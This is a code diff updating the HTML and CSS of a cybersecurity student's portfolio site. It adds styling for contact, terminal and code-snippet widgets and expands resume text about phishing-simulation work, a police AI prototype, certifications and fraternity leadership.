@@ -512,6 +512,40 @@
 
     .about-right { display: flex; flex-direction: column; gap: 2rem; }
 
+    /* Quick-facts profile card to fill right column */
+    .about-profile-card {
+      border: 1px solid var(--border);
+      background: var(--panel);
+      position: relative;
+      overflow: hidden;
+    }
+    .about-profile-card::before {
+      content: '';
+      position: absolute; top:0; left:0; right:0; height:2px;
+      background: linear-gradient(90deg, var(--crimson), var(--gold), transparent);
+    }
+    .apc-row {
+      display: grid;
+      grid-template-columns: 100px 1fr;
+      gap: 1rem;
+      padding: 0.85rem 1.4rem;
+      border-bottom: 1px solid var(--border);
+      align-items: baseline;
+      transition: background 0.2s;
+    }
+    .apc-row:last-child { border-bottom: none; }
+    .apc-row:hover { background: var(--panel2); }
+    .apc-label {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.58rem; color: var(--crimson-light);
+      letter-spacing: 0.1em; text-transform: uppercase;
+      padding-top: 0.05rem;
+    }
+    .apc-val {
+      font-size: 0.82rem; color: var(--text);
+      font-weight: 300; line-height: 1.5;
+    }
+
     /* Awards photo — fixed height */
     .awards-photo-frame {
       position: relative;
@@ -858,40 +892,224 @@
     #contact { background: var(--bg2); padding: 9rem 5rem; position: relative; z-index: 1; }
 
     .contact-layout {
-      display: grid; grid-template-columns: 1fr 1fr;
-      gap: 6rem; align-items: center;
+      display: grid; grid-template-columns: 1.15fr 0.85fr;
+      gap: 4rem; align-items: start;
     }
-    .contact-left p {
-      font-size: 1rem; color: var(--text-mid); line-height: 1.85;
-      font-weight: 300; margin-bottom: 2rem;
-    }
-    .contact-ctas { display: flex; gap: 1rem; flex-wrap: wrap; }
-    .contact-right { display: flex; flex-direction: column; border: 1px solid var(--border); }
-    .contact-detail {
-      padding: 1.6rem 2.2rem; border-bottom: 1px solid var(--border);
-      display: flex; align-items: center; gap: 1.3rem; transition: background 0.2s;
-    }
-    .contact-detail:last-child { border-bottom: none; }
-    .contact-detail:hover { background: var(--panel); }
-    .contact-detail-icon {
-      flex-shrink: 0; opacity: 0.55;
-      width: 18px; height: 18px; color: var(--gold);
-    }
-    .contact-detail-icon svg {
-      width: 100%; height: 100%;
-      stroke: currentColor; fill: none;
-      stroke-width: 1.5; stroke-linecap: round; stroke-linejoin: round;
-    }
-    .contact-detail:hover .contact-detail-icon { opacity: 0.9; }
-    .contact-detail-label {
+    .contact-left { display: flex; flex-direction: column; gap: 2rem; }
+
+    /* ── MISSION ── */
+    .contact-mission { position: relative; }
+    .contact-mission-kicker {
       font-family: 'IBM Plex Mono', monospace;
-      font-size: 0.55rem; color: var(--gold);
-      letter-spacing: 0.14em; text-transform: uppercase;
-      display: block; margin-bottom: 0.2rem;
+      font-size: 0.6rem; letter-spacing: 0.18em;
+      color: var(--crimson-light); text-transform: uppercase;
+      margin-bottom: 1.1rem;
     }
-    .contact-detail-val { font-size: 0.88rem; color: var(--text); font-weight: 300; }
-    .contact-detail a { color: inherit; text-decoration: none; transition: color 0.2s; }
-    .contact-detail a:hover { color: var(--gold-light); }
+    .contact-quote {
+      margin: 0 0 1.4rem 0;
+      padding: 1.4rem 1.6rem;
+      border-left: 3px solid var(--gold);
+      background: rgba(201,168,76,0.04);
+      font-family: 'Syne', sans-serif;
+      font-size: 1.08rem; font-weight: 700;
+      color: var(--white); line-height: 1.65;
+      font-style: normal; position: relative;
+    }
+    .contact-quote::before {
+      content: '"';
+      position: absolute; top: -0.6rem; left: 1.2rem;
+      font-size: 4rem; color: var(--gold); opacity: 0.18;
+      font-family: 'Syne', sans-serif; line-height: 1;
+    }
+    .contact-mission-body {
+      font-size: 0.95rem; line-height: 1.85;
+      color: var(--text-mid); font-weight: 300; margin-bottom: 0.8rem;
+    }
+    .contact-mission-body strong { color: var(--gold-light); font-weight: 500; }
+
+    /* ── CONTACT TERMINAL ── */
+    .contact-terminal {
+      background: #040206;
+      border: 1px solid rgba(139,26,26,0.3);
+      position: relative; overflow: hidden;
+    }
+    .contact-terminal::before {
+      content: '';
+      position: absolute; top:0; left:0; right:0; height:1px;
+      background: linear-gradient(90deg, var(--crimson), var(--gold), transparent);
+    }
+    .ct-bar {
+      background: #0e060c;
+      padding: 0.5rem 1rem;
+      display: flex; align-items: center; gap: 0.5rem;
+      border-bottom: 1px solid rgba(139,26,26,0.2);
+    }
+    .ct-dot { width:9px;height:9px;border-radius:50%;flex-shrink:0; }
+    .ct-dot.r{background:#8b1a1a;} .ct-dot.y{background:#c9a84c;} .ct-dot.g{background:#27ae60;}
+    .ct-title {
+      font-family:'IBM Plex Mono',monospace; font-size:0.58rem;
+      color:var(--text-dim); letter-spacing:0.1em; margin-left:0.4rem;
+    }
+    .ct-hint { margin-left:auto; font-family:'IBM Plex Mono',monospace; font-size:0.52rem; color:#2a3040; letter-spacing:0.06em; }
+    .ct-output {
+      padding: 0.8rem 1rem 0.4rem;
+      min-height: 110px; max-height: 160px;
+      overflow-y: auto; font-family:'IBM Plex Mono',monospace;
+      font-size: 0.67rem; line-height:1.75; color:#6a7a8a;
+    }
+    .ct-output::-webkit-scrollbar{width:2px;}
+    .ct-output::-webkit-scrollbar-thumb{background:var(--crimson);}
+    .ct-out-line { display:block; }
+    .ct-out-line.ct-cmd { color: var(--gold); }
+    .ct-out-line.ct-res { color: #8da0a8; padding-left:1rem; }
+    .ct-out-line.ct-hi  { color: var(--gold-light); padding-left:1rem; font-weight:500; }
+    .ct-out-line.ct-err { color: var(--crimson-light); padding-left:1rem; }
+    .ct-out-line.ct-dim { color: #2e3a44; padding-left:1rem; }
+    .ct-input-row {
+      display:flex; align-items:center; gap:0.5rem;
+      padding:0.5rem 1rem 0.65rem;
+      border-top:1px solid rgba(255,255,255,0.035);
+    }
+    .ct-prompt { color:var(--crimson-light); font-family:'IBM Plex Mono',monospace; font-size:0.67rem; flex-shrink:0; }
+    #ctInput {
+      flex:1; background:transparent; border:none; outline:none;
+      font-family:'IBM Plex Mono',monospace; font-size:0.67rem;
+      color: var(--gold); caret-color: var(--gold);
+    }
+    #ctInput::placeholder { color:#1e2a34; }
+
+    /* ── CONTACT FORM ── */
+    .contact-form {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      position: relative; overflow: hidden;
+    }
+    .contact-form::before {
+      content:'';
+      position:absolute;top:0;left:0;right:0;height:1px;
+      background:linear-gradient(90deg,transparent,var(--gold),transparent);
+      opacity:0.4;
+    }
+    .cf-header {
+      padding: 1rem 1.4rem 0.8rem;
+      border-bottom: 1px solid var(--border);
+      font-family:'IBM Plex Mono',monospace;
+      font-size:0.58rem; letter-spacing:0.12em;
+      color:var(--text-dim); text-transform:uppercase;
+      display:flex; align-items:center; gap:0.6rem;
+    }
+    .cf-header svg { color:var(--gold); opacity:0.7; flex-shrink:0; }
+    .cf-body { padding:1.2rem 1.4rem; display:flex; flex-direction:column; gap:0.9rem; }
+    .cf-row { display:grid; grid-template-columns:1fr 1fr; gap:0.9rem; }
+    .cf-field { display:flex; flex-direction:column; gap:0.4rem; }
+    .cf-label {
+      font-family:'IBM Plex Mono',monospace; font-size:0.55rem;
+      letter-spacing:0.1em; color:var(--crimson-light); text-transform:uppercase;
+    }
+    .cf-input, .cf-textarea {
+      background: #070508; border:1px solid var(--border);
+      color:var(--text); font-family:'Inter',sans-serif;
+      font-size:0.82rem; font-weight:300; padding:0.6rem 0.8rem;
+      outline:none; transition: border-color 0.2s, box-shadow 0.2s;
+      resize:none;
+    }
+    .cf-input:focus, .cf-textarea:focus {
+      border-color: rgba(201,168,76,0.5);
+      box-shadow: 0 0 0 2px rgba(201,168,76,0.06);
+    }
+    .cf-textarea { min-height:80px; }
+    .cf-footer {
+      padding:0.8rem 1.4rem 1.2rem;
+      display:flex; align-items:center; justify-content:space-between;
+      gap:1rem;
+    }
+    .cf-status { font-family:'IBM Plex Mono',monospace; font-size:0.58rem; color:var(--text-dim); }
+    .cf-status.sent { color:#27ae60; }
+    .cf-status.err  { color:var(--crimson-light); }
+    .cf-submit {
+      background:var(--crimson); border:none; color:var(--gold-light);
+      font-family:'IBM Plex Mono',monospace; font-size:0.65rem;
+      letter-spacing:0.12em; text-transform:uppercase;
+      padding:0.65rem 1.4rem; cursor:pointer;
+      transition:background 0.2s, transform 0.15s, box-shadow 0.2s;
+      flex-shrink:0;
+    }
+    .cf-submit:hover {
+      background:#9a2020; transform:translateY(-1px);
+      box-shadow:0 4px 16px rgba(139,26,26,0.4);
+    }
+
+    /* ── PGP Block ── */
+    .pgp-block {
+      background: #050304; border: 1px solid rgba(139,26,26,0.3);
+      position: relative; overflow: hidden;
+    }
+    .pgp-block::before {
+      content: '';
+      position: absolute; top:0; left:0; right:0; height:1px;
+      background: linear-gradient(90deg, var(--crimson), var(--gold), transparent);
+    }
+    .pgp-header {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 0.65rem 1rem; border-bottom: 1px solid rgba(139,26,26,0.2);
+      background: rgba(139,26,26,0.06);
+    }
+    .pgp-header-left {
+      display: flex; align-items: center; gap: 0.55rem;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.58rem; letter-spacing: 0.12em;
+      color: var(--crimson-light); text-transform: uppercase;
+    }
+    .pgp-header-left svg { color: var(--crimson-light); flex-shrink: 0; }
+    .pgp-algo { font-family:'IBM Plex Mono',monospace; font-size:0.55rem; color:var(--text-dim); letter-spacing:0.1em; }
+    .pgp-body { padding: 0.9rem 1rem; display:flex; flex-direction:column; gap:0.12rem; }
+    .pgp-line {
+      font-family:'IBM Plex Mono',monospace; font-size:0.6rem;
+      color:var(--gold); letter-spacing:0.03em; line-height:1.6; display:block;
+    }
+    .pgp-line.pgp-data { color:#2e3d48; transition:color 0.15s; }
+    .pgp-block:hover .pgp-line.pgp-data { color:#3d5060; }
+    .pgp-footer {
+      padding:0.6rem 1rem; border-top:1px solid rgba(255,255,255,0.04);
+      display:flex; align-items:baseline; gap:1rem; background:rgba(0,0,0,0.25);
+      flex-wrap:wrap;
+    }
+    .pgp-fp-label { font-family:'IBM Plex Mono',monospace; font-size:0.5rem; letter-spacing:0.14em; color:var(--crimson-light); text-transform:uppercase; flex-shrink:0; }
+    .pgp-fp { font-family:'IBM Plex Mono',monospace; font-size:0.56rem; color:#2e3d48; letter-spacing:0.05em; line-height:1.6; }
+
+    .contact-ctas { display:flex; gap:1rem; flex-wrap:wrap; padding-top:0.5rem; }
+
+    /* ── CONTACT RIGHT ── */
+    .contact-right { display:flex; flex-direction:column; border:1px solid var(--border); position:sticky; top:7rem; }
+    .contact-detail {
+      padding:1.6rem 2rem; border-bottom:1px solid var(--border);
+      display:flex; align-items:center; gap:1.3rem;
+      transition:background 0.2s, padding-left 0.25s;
+    }
+    .contact-detail:last-child { border-bottom:none; }
+    .contact-detail:hover { background:var(--panel); padding-left:2.6rem; }
+    .contact-detail-icon { flex-shrink:0; opacity:0.55; width:18px; height:18px; color:var(--gold); }
+    .contact-detail-icon svg { width:100%;height:100%;stroke:currentColor;fill:none;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round; }
+    .contact-detail:hover .contact-detail-icon { opacity:0.9; }
+    .contact-detail-label { font-family:'IBM Plex Mono',monospace; font-size:0.55rem; color:var(--gold); letter-spacing:0.14em; text-transform:uppercase; display:block; margin-bottom:0.2rem; }
+    .contact-detail-val { font-size:0.88rem; color:var(--text); font-weight:300; }
+    .contact-detail a { color:inherit; text-decoration:none; transition:color 0.2s; }
+    .contact-detail a:hover { color:var(--gold-light); }
+    /* Status badge on contact right */
+    .contact-status-badge {
+      padding:1rem 2rem; background:rgba(139,26,26,0.07);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; gap:0.75rem;
+    }
+    .csb-dot {
+      width:7px;height:7px;border-radius:50%;
+      background:#27ae60;flex-shrink:0;
+      box-shadow:0 0 0 3px rgba(39,174,96,0.2);
+      animation:csbPulse 2.5s ease infinite;
+    }
+    @keyframes csbPulse{0%,100%{box-shadow:0 0 0 3px rgba(39,174,96,0.2);}50%{box-shadow:0 0 0 6px rgba(39,174,96,0.08);}}
+    .csb-text { font-family:'IBM Plex Mono',monospace; font-size:0.6rem; color:#27ae60; letter-spacing:0.08em; }
+    .csb-sub { font-family:'IBM Plex Mono',monospace; font-size:0.54rem; color:var(--text-dim); letter-spacing:0.06em; display:block; margin-top:0.15rem; }
 
     /* ══════════════════════════════
        FOOTER
@@ -1062,6 +1280,145 @@
       animation: orbitSpin var(--spd) linear infinite;
     }
     @keyframes orbitSpin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
+
+    /* ── CODE SNIPPETS in project cards ── */
+    .proj-code-snippet {
+      background: #070508;
+      border: 1px solid rgba(139,26,26,0.2);
+      border-left: 2px solid var(--crimson);
+      border-radius: 4px;
+      padding: 0.9rem 1rem;
+      margin: 1rem 0;
+      overflow: hidden;
+      position: relative;
+    }
+    .proj-code-snippet::before {
+      content: '';
+      position: absolute; top:0; left:0; right:0; height:1px;
+      background: linear-gradient(90deg, var(--crimson), var(--gold), transparent);
+      opacity: 0.5;
+    }
+    .proj-code-snippet pre { margin:0; }
+    .proj-code-snippet code {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.68rem; line-height: 1.7;
+      color: #b8bfcc; display: block;
+      white-space: pre; overflow-x: auto;
+    }
+    .code-comment { color: #4a5568; font-style: italic; }
+    .code-kw      { color: #b02020; font-weight: 500; }
+    .code-fn      { color: #c9a84c; }
+    .code-str     { color: #6a9955; }
+    .code-num     { color: #b5cea8; }
+    .code-tag     { color: #569cd6; }
+    .code-attr    { color: #9cdcfe; }
+    .proj-card:hover .proj-code-snippet {
+      border-left-color: var(--gold);
+    }
+
+    /* ── PROJECTS GRID — 3 col with last row centered ── */
+    .projects-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1px; background: var(--border);
+    }
+    .terminal-card { grid-column: span 1; }
+
+    /* ── TERMINAL WIDGET ── */
+    #terminal-widget {
+      background: #050305;
+      border: 1px solid rgba(139,26,26,0.25);
+      border-radius: 6px;
+      overflow: hidden;
+      margin: 1rem 0;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.68rem;
+    }
+    .term-bar {
+      background: #120a10;
+      padding: 0.5rem 0.8rem;
+      display: flex; align-items: center; gap: 0.5rem;
+      border-bottom: 1px solid rgba(139,26,26,0.2);
+    }
+    .term-dot { width:10px;height:10px;border-radius:50%;flex-shrink:0; }
+    .term-dot.r { background:#8b1a1a; }
+    .term-dot.y { background:#c9a84c; }
+    .term-dot.g { background:#27ae60; }
+    .term-title { color: var(--text-dim); font-size:0.6rem; letter-spacing:0.08em; margin-left:0.5rem; }
+    .term-body {
+      padding: 0.8rem 1rem;
+      min-height: 140px; max-height: 180px;
+      overflow-y: auto; color: #8da0a8;
+      line-height: 1.8;
+    }
+    .term-body::-webkit-scrollbar { width:2px; }
+    .term-body::-webkit-scrollbar-thumb { background: var(--crimson); }
+    .term-line { display:block; }
+    .term-line.cmd  { color: var(--gold); }
+    .term-line.out  { color: #7a8a8a; padding-left:1rem; }
+    .term-line.hit  { color: #b02020; padding-left:1rem; }
+    .term-line.ok   { color: #27ae60; padding-left:1rem; }
+    .term-line.warn { color: var(--gold-light); padding-left:1rem; }
+    .term-input-row {
+      padding: 0.4rem 1rem 0.6rem;
+      display:flex; align-items:center; gap:0.4rem;
+      border-top: 1px solid rgba(255,255,255,0.04);
+    }
+    .term-prompt { color: var(--crimson-light); }
+    .term-cursor {
+      color: var(--gold);
+      animation: termBlink 1s step-end infinite;
+    }
+    @keyframes termBlink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    /* ── CODEMINI in skills section ── */
+    .skills-code-block {
+      background: #070508;
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--gold);
+      border-radius: 4px;
+      padding: 1rem 1.2rem;
+      margin-top: 1.5rem;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.65rem;
+      color: #7a8898;
+      line-height: 1.8;
+    }
+    .skills-code-block .code-kw { color: #b02020; }
+    .skills-code-block .code-str { color: #6a9955; }
+    .skills-code-block .code-fn { color: var(--gold); }
+    .skills-code-block .code-comment { color: #3d4a52; }
+
+    /* ── THREAT STRIP between about and experience ── */
+    .threat-strip {
+      background: var(--bg3);
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      padding: 2rem 5rem;
+      display: flex; gap: 0;
+      position: relative; z-index: 1;
+    }
+    .threat-cell {
+      flex: 1; padding: 0 2rem;
+      border-right: 1px solid var(--border);
+      display: flex; flex-direction: column; gap: 0.3rem;
+    }
+    .threat-cell:first-child { padding-left: 0; }
+    .threat-cell:last-child { border-right: none; }
+    .threat-label {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.55rem; color: var(--text-dim);
+      letter-spacing: 0.14em; text-transform: uppercase;
+    }
+    .threat-val {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.9rem; font-weight: 700;
+      color: var(--white);
+    }
+    .threat-val .threat-accent { color: var(--gold); }
+    .threat-val .threat-red { color: var(--crimson-light); }
+    .threat-bar-wrap { height: 2px; background: var(--border); margin-top: 0.4rem; border-radius:1px; }
+    .threat-bar-fill { height: 100%; border-radius:1px; background: linear-gradient(90deg, var(--crimson), var(--gold)); }
 
     /* ── DOT POP ── */
     @keyframes dotPop {
@@ -1242,7 +1599,6 @@
   <!-- MARQUEE -->
   <div class="marquee-strip" aria-hidden="true">
     <div class="marquee-inner">
-      <!-- duplicated for seamless loop -->
       <span class="marquee-item">AP2T Labs <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">Fidelity Investments <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">FBI Collegiate Academy <span class="marquee-sep">✦</span></span>
@@ -1251,6 +1607,12 @@
       <span class="marquee-item">Indiana University <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">800+ Phishing Simulations <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">1M+ Employees Reached <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Google Certified <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">YOLOv8 · OpenCV · OSINT <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Kali Linux · Metasploit <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">4.6 GPA · Summa Cum Laude <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Cross-Continental Deployment <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">$3.1M Real Estate Negotiated <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">AP2T Labs <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">Fidelity Investments <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">FBI Collegiate Academy <span class="marquee-sep">✦</span></span>
@@ -1259,6 +1621,12 @@
       <span class="marquee-item">Indiana University <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">800+ Phishing Simulations <span class="marquee-sep">✦</span></span>
       <span class="marquee-item">1M+ Employees Reached <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Google Certified <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">YOLOv8 · OpenCV · OSINT <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Kali Linux · Metasploit <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">4.6 GPA · Summa Cum Laude <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">Cross-Continental Deployment <span class="marquee-sep">✦</span></span>
+      <span class="marquee-item">$3.1M Real Estate Negotiated <span class="marquee-sep">✦</span></span>
     </div>
   </div>
 
@@ -1272,16 +1640,19 @@
     </div>
     <div class="about-layout">
       <div class="about-text">
-        <p>I am a <strong>Cybersecurity &amp; Global Policy</strong> double major at Indiana University with demonstrated experience spanning offensive security operations, enterprise AI development, and high-stakes institutional leadership — a rare convergence of technical depth and strategic range.</p>
-        <p>At <strong>AP2T Labs</strong>, I engineered over <strong>800 high-fidelity phishing simulations</strong> deployed in campaigns reaching more than <strong>one million employees</strong>. I replicated the visual and behavioral fingerprints of Microsoft 365, Google Workspace, Slack, and Apple — building adversarial realism at scale while maintaining rigorous ethical guardrails.</p>
-        <p>In a cross-continental collaboration with <strong>Indiana University, Northumbria University, and Northumbria Police</strong>, I developed and deployed a live AI platform prototype for UK law enforcement. I also attended <strong>DEF CON</strong> in Las Vegas, gaining direct exposure to leading-edge offensive and defensive security research.</p>
-        <p>As elected <strong>President of Kappa Sigma</strong>, I transformed a struggling chapter into a 170+ member organization ranked <strong>2nd of 35 chapters</strong> at Indiana University, while managing $3.1M in real estate negotiations. Long-term objective: operating at the convergence of <strong>cyber operations and international security strategy</strong>.</p>
+        <p>I am a <strong>Cybersecurity &amp; Global Policy</strong> double major at Indiana University — a rare dual-track designed for operators who work at the intersection of technical systems and geopolitical strategy. My profile spans offensive security, enterprise AI deployment, and executive institutional leadership, built through live production environments, not coursework alone.</p>
+        <p>At <strong>AP2T Labs</strong>, I engineered over <strong>800 high-fidelity phishing simulation templates</strong> reaching more than <strong>one million employees</strong> across finance, tech, education, and legal sectors. I replicated the exact visual and behavioral fingerprints of Microsoft 365, Google Workspace, Slack, and Apple — including MFA fatigue attacks, smishing vectors, calendar-invite lures, and OAuth credential prompts — with pixel-accurate HTML/CSS and cross-client rendering integrity across Outlook, Gmail, Apple Mail, and mobile.</p>
+        <p>In a cross-continental research collaboration spanning <strong>Indiana University, Northumbria University, and Northumbria Police</strong>, I designed and deployed a live AI platform prototype for active law enforcement use — one of the few student-built tools to enter institutional operational testing. I also attended <strong>DEF CON</strong> in Las Vegas, engaging directly with offensive researchers, CTF competitors, and national security professionals at the field's frontier.</p>
+        <p>As elected <strong>President of Kappa Sigma Beta Theta</strong>, I scaled a sub-100 member chapter to <strong>170+ members</strong>, ranking <strong>2nd of 35</strong> chapters at Indiana University. I personally led <strong>$3.1M in real estate negotiations</strong> with university administration and alumni boards, oversaw five department heads, and managed risk, governance, recruitment, and philanthropy simultaneously — a governance structure that mirrors small executive teams.</p>
+        <p>Long-term objective: operating at the convergence of <strong>offensive cyber operations, AI systems, and international security doctrine</strong> — advising or executing at the level where technical capability meets strategic decision-making.</p>
         <div class="credentials">
-          <div class="cred-item"><strong>FBI Indianapolis Collegiate Academy</strong> — Graduate, 2025</div>
-          <div class="cred-item"><strong>DEF CON Las Vegas</strong> — Attendee, 2025 · Sponsored by AP2T Labs</div>
-          <div class="cred-item"><strong>Fidelity Investments</strong> — Audit, Risk &amp; Compliance Intern, Summer 2026</div>
-          <div class="cred-item"><strong>Dean's Scholarship &amp; Hoosier Scholars</strong> — Indiana University</div>
-          <div class="cred-item"><strong>Google Cybersecurity Professional</strong> — Certified, July 2025</div>
+          <div class="cred-item"><strong>FBI Indianapolis Collegiate Academy</strong> — Competitive Selection, 2025</div>
+          <div class="cred-item"><strong>DEF CON Las Vegas</strong> — Sponsored Attendee · AP2T Labs, 2025</div>
+          <div class="cred-item"><strong>Fidelity Investments ARC</strong> — Audit, Risk &amp; Compliance Intern, Summer 2026</div>
+          <div class="cred-item"><strong>Google Cybersecurity Professional Certificate</strong> — Certified, July 2025</div>
+          <div class="cred-item"><strong>CompTIA ITF+</strong> — Certified · <strong>Security+</strong> In Progress</div>
+          <div class="cred-item"><strong>Dean's Scholarship &amp; Hoosier Scholars Program</strong> — Indiana University, 2024</div>
+          <div class="cred-item"><strong>Summa Cum Laude</strong> — High School Graduation · 4.6 GPA</div>
         </div>
       </div>
       <div class="about-right">
@@ -1290,16 +1661,67 @@
           <div class="awards-photo-label">IU OSFL Awards · 2025 — 4 Chapter Awards incl. 2nd Place Chapter of Achievement</div>
         </div>
         <div class="stats-panel">
-          <div class="stat"><div class="stat-num">800<sup>+</sup></div><div class="stat-label">Phishing Simulations<br>Engineered</div></div>
-          <div class="stat"><div class="stat-num">1M<sup>+</sup></div><div class="stat-label">Employees Reached<br>in Campaigns</div></div>
-          <div class="stat"><div class="stat-num">170<sup>+</sup></div><div class="stat-label">Member Org<br>Led as President</div></div>
-          <div class="stat"><div class="stat-num">$3.1<sup>M</sup></div><div class="stat-label">Real Estate Value<br>Negotiated</div></div>
+          <div class="stat"><div class="stat-num">800<sup>+</sup></div><div class="stat-label">Phishing Templates<br>Engineered</div></div>
+          <div class="stat"><div class="stat-num">1M<sup>+</sup></div><div class="stat-label">Employees Reached<br>in Live Campaigns</div></div>
+          <div class="stat"><div class="stat-num">170<sup>+</sup></div><div class="stat-label">Member Organization<br>Led as President</div></div>
+          <div class="stat"><div class="stat-num">$3.1<sup>M</sup></div><div class="stat-label">Real Estate Value<br>Personally Negotiated</div></div>
           <div class="stat"><div class="stat-num">2<sup>nd</sup></div><div class="stat-label">of 35 Chapters —<br>IU Achievement Rank</div></div>
-          <div class="stat"><div class="stat-num">$100<sup>K+</sup></div><div class="stat-label">Raised Through<br>Philanthropy</div></div>
+          <div class="stat"><div class="stat-num">4.6</div><div class="stat-label">High School GPA<br>Summa Cum Laude</div></div>
+        </div>
+        <!-- Mini profile card to fill space -->
+        <div class="about-profile-card">
+          <div class="apc-row">
+            <div class="apc-label">Status</div>
+            <div class="apc-val"><span class="dot-green" style="display:inline-block;width:6px;height:6px;border-radius:50%;vertical-align:middle;margin-right:6px;"></span>Open to Roles · Summer 2026+</div>
+          </div>
+          <div class="apc-row">
+            <div class="apc-label">Focus Areas</div>
+            <div class="apc-val">Offensive Security · AI Systems · Intelligence Policy</div>
+          </div>
+          <div class="apc-row">
+            <div class="apc-label">Clearance</div>
+            <div class="apc-val">TS/SCI Eligible · No Prior Restrictions</div>
+          </div>
+          <div class="apc-row">
+            <div class="apc-label">Education</div>
+            <div class="apc-val">Indiana University · B.S. Cybersecurity &amp; B.A. Global Policy · 2028</div>
+          </div>
+          <div class="apc-row">
+            <div class="apc-label">Languages</div>
+            <div class="apc-val">Python · JavaScript · SQL · Bash · HTML/CSS</div>
+          </div>
+          <div class="apc-row">
+            <div class="apc-label">Location</div>
+            <div class="apc-val">Bloomington, IN · Cincinnati, OH · Remote</div>
+          </div>
         </div>
       </div>
     </div>
   </section>
+
+  <!-- THREAT INTEL STRIP -->
+  <div class="threat-strip">
+    <div class="threat-cell">
+      <div class="threat-label">Attack Vectors Simulated</div>
+      <div class="threat-val"><span class="threat-accent">MFA Fatigue</span> · OAuth · Smishing · Credential Harvest</div>
+      <div class="threat-bar-wrap"><div class="threat-bar-fill" style="width:95%"></div></div>
+    </div>
+    <div class="threat-cell">
+      <div class="threat-label">Frameworks</div>
+      <div class="threat-val">MITRE ATT&amp;CK · NIST CSF · <span class="threat-accent">Kill Chain</span></div>
+      <div class="threat-bar-wrap"><div class="threat-bar-fill" style="width:82%"></div></div>
+    </div>
+    <div class="threat-cell">
+      <div class="threat-label">Tools &amp; Platforms</div>
+      <div class="threat-val">Kali · Metasploit · Wireshark · <span class="threat-accent">Shodan</span> · Burp</div>
+      <div class="threat-bar-wrap"><div class="threat-bar-fill" style="width:78%"></div></div>
+    </div>
+    <div class="threat-cell">
+      <div class="threat-label">Clearance Interest</div>
+      <div class="threat-val"><span class="threat-red">TS/SCI</span> Eligible · No Prior Restrictions</div>
+      <div class="threat-bar-wrap"><div class="threat-bar-fill" style="width:100%;background:var(--crimson);"></div></div>
+    </div>
+  </div>
 
   <!-- EXPERIENCE -->
   <section id="experience">
@@ -1322,9 +1744,10 @@
           <div class="exp-org">AP2T Labs</div>
           <ul class="exp-bullets">
             <li>Engineered <strong>800+ high-fidelity phishing simulation templates</strong> for enterprise security awareness campaigns reaching over one million employees across finance, technology, education, and legal sectors.</li>
-            <li>Replicated brand ecosystems — Microsoft 365, Google Workspace, Slack, Apple — with pixel-accurate HTML/CSS encompassing MFA fatigue, smishing, calendar-invite lures, and credential-prompt vectors.</li>
-            <li>Built a <strong>rapid production design system</strong> to ideate, code, QA, and deploy dozens of branded simulations daily, maintaining visual authenticity and cross-platform rendering integrity.</li>
-            <li>Operated within a red team simulation lab balancing adversarial realism with corporate compliance and security education standards.</li>
+            <li>Replicated brand ecosystems — Microsoft 365, Google Workspace, Slack, Apple, DocuSign, Chase, Coinbase — with pixel-accurate HTML/CSS encompassing MFA fatigue, smishing, calendar-invite lures, OAuth hijack prompts, and credential-harvesting vectors.</li>
+            <li>Built a <strong>rapid production design system</strong> to ideate, code, QA, and deploy dozens of branded simulations daily — including full cross-client rendering validation across Outlook, Gmail, Apple Mail, iOS, and Android.</li>
+            <li>Operated within a professional red team simulation lab, balancing adversarial realism, technical precision, and compliance with NIST and enterprise security education standards.</li>
+            <li>Developed internal tooling to automate template generation, metadata tagging, and campaign analytics ingestion, reducing per-simulation build time by ~60%.</li>
           </ul>
           <div class="exp-tags"><span class="tag">Red Teaming</span><span class="tag">HTML / CSS</span><span class="tag">Social Engineering</span><span class="tag">Security Awareness</span><span class="tag">UX Deception</span></div>
         </div>
@@ -1359,8 +1782,9 @@
           <div class="exp-role">AI Tool Developer</div>
           <div class="exp-org">Northumbria Police × Indiana University × Northumbria University</div>
           <ul class="exp-bullets">
-            <li>Developed and deployed a <strong>live AI platform prototype</strong> for Northumbria Police in a cross-continental collaboration between two universities and an active law enforcement agency.</li>
-            <li>Applied UX design principles and AI engineering to build a responsive, accessible web platform purpose-built for law enforcement operational requirements.</li>
+            <li>Developed and deployed a <strong>live AI platform prototype</strong> for Northumbria Police in a cross-continental collaboration between two universities and an active law enforcement agency — one of few student-built tools to enter institutional operational testing.</li>
+            <li>Designed system architecture, conversational AI flows, and a responsive web interface purpose-built for law enforcement operational requirements and accessibility standards.</li>
+            <li>Coordinated across two countries and three institutions, navigating UK data protection regulations (UK GDPR), operational security constraints, and cross-cultural research methodologies.</li>
           </ul>
           <div class="exp-tags"><span class="tag">AI Development</span><span class="tag">UX / HCI</span><span class="tag">Public Safety Tech</span><span class="tag">International</span></div>
         </div>
